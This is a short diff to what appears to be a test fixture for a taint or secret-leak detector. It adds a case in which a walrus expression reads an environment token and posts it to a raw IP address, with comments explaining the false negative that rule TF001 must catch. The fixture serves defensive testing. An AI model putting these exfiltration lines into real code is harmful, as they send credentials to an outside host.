@@ -121,6 +121,13 @@ def v13_for_target():
         requests.post("https://93.184.216.35/f", data=v)
 
 
+def v15_walrus_and_post():
+    # a walrus binds the secret in a SEPARATE clause of the SAME statement, then the sink
+    # uses the bound NAME: `(token := os.getenv()) and post(data=token)`. The taint pass must
+    # apply the walrus BEFORE scanning the sink in the same statement (round-4 audit FN) -> TF001
+    (token := os.getenv("AND_TOKEN")) and requests.post("https://45.83.122.11/a", data=token)
+
+
 def v14_comprehension_target():
     # secret bound by a COMPREHENSION generator target, sink in the element expr — a
     # comprehension is its own scope (Codex round 2: this read GREEN) -> TF001
